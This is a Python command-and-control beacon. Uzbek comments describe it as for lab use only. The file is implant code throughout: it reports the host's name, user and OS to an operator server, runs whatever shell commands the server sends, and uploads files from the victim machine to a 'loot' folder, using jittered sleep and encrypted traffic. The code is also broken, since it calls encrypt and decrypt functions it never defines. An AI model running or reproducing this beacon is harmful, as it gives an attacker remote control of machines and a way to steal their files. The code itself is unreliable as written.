#!/usr/bin/env python3
"""C2 Lab beacon — FAQAT lab muhitida. Download/upload + ATT&CK qo'llab-quvvatlash."""

import argparse
import base64
import json
import os
import platform
import random
import socket
import subprocess
import time
import urllib.request
from urllib.parse import quote

from Crypto.Cipher import AES


BID = f"{socket.gethostname()}-{random.randint(1000, 9999)}"


def http_get(url):
    return urllib.request.urlopen(url, timeout=30).read()


def checkin(server):
    info = {"bid": BID, "hostname": socket.gethostname(),
            "user": os.environ.get("USER") or os.environ.get("USERNAME", "?"),
            "os": platform.platform(), "sleep": 0}
    payload = base64.b64encode(encrypt(json.dumps(info).encode())).decode()
    return json.loads(decrypt(http_get(f"{server.rstrip('/')}/checkin?d={payload}")))


def submit(server, task_id, output):
    data = encrypt(json.dumps({"task_id": task_id, "bid": BID,
                               "output": output[:100000]}).encode())
    req = urllib.request.Request(f"{server.rstrip('/')}/submit", data=data,
                                 headers={"Content-Type": "application/octet-stream"})
    urllib.request.urlopen(req, timeout=30)


def download_file(server, remote_path):
    """Target -> C2 (loot/)."""
    name = os.path.basename(remote_path)
    url = f"{server.rstrip('/')}/get?b={quote(BID)}&n={base64.b64encode(name.encode()).decode()}"
    # C2 loot/ dan beaconning o'zidagi faylni emas, beacon yuboradi — shuning uchun
    # beacon faylni o'qib, upload qiladi (quyidagi upload_file), bu esa C2'ning
    # /get endpointidan loot arxivini olish uchun operator tomonga.
    data = http_get(url)
    return f"downloaded {len(data)}B (C2 loot)"


def upload_file(server, remote_path):
    """Target faylni C2'ga yuborish (loot/<bid>/)."""
    with open(remote_path, "rb") as f:
        data = f.read()
    name = os.path.basename(remote_path)
    url = f"{server.rstrip('/')}/upload?b={quote(BID)}&n={base64.b64encode(name.encode()).decode()}"
    req = urllib.request.Request(url, data=encrypt(data),
                                 headers={"Content-Type": "application/octet-stream"})
    urllib.request.urlopen(req, timeout=60)
    return f"uploaded {len(data)}B -> C2 loot/{BID}/{name}"


def execute(cmd):
    """Komandani bajarish. Maxsus komandalar: download, upload."""
    parts = cmd.split(maxsplit=1)
    if parts[0] == "download" and len(parts) == 2:
        return upload_file(SERVER, parts[1])   # targetdagi fayl C2'ga ketadi
    if parts[0] == "upload" and len(parts) == 2:
        try:
            return download_file(SERVER, parts[1])
        except Exception as e:
            return f"XATO: {e}"
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, timeout=60)
        return (r.stdout + r.stderr).decode(errors="replace") or "(bo'sh natija)"
    except subprocess.TimeoutExpired:
        return "XATO: timeout (60s)"
    except Exception as e:
        return f"XATO: {e}"


SERVER = ""
ATTACK_MAP = {
    "download": "T1005", "upload": "T1105",
}


def main():
    global SERVER
    ap = argparse.ArgumentParser()
    ap.add_argument("--server", required=True)
    ap.add_argument("--sleep", type=float, default=10.0)
    ap.add_argument("--jitter", type=float, default=0.2)
    args = ap.parse_args()
    SERVER = args.server.rstrip("/")

    print(f"[+] Beacon: {BID} -> {SERVER}")
    while True:
        try:
            task = checkin(SERVER)
            if task:
                aid = ATTACK_MAP.get(task["command"].split()[0], task.get("attack_id", "T1059"))
                print(f"[task {task['task_id']}] [{aid}] {task['command']}")
                out = f"[ATT&CK {aid}]\n" + execute(task["command"])
                submit(SERVER, task["task_id"], out)
        except Exception as e:
            print(f"xato: {e}")
        interval = args.sleep * (1 + random.uniform(-args.jitter, args.jitter))
        time.sleep(max(1, interval))


if __name__ == "__main__":
    main()
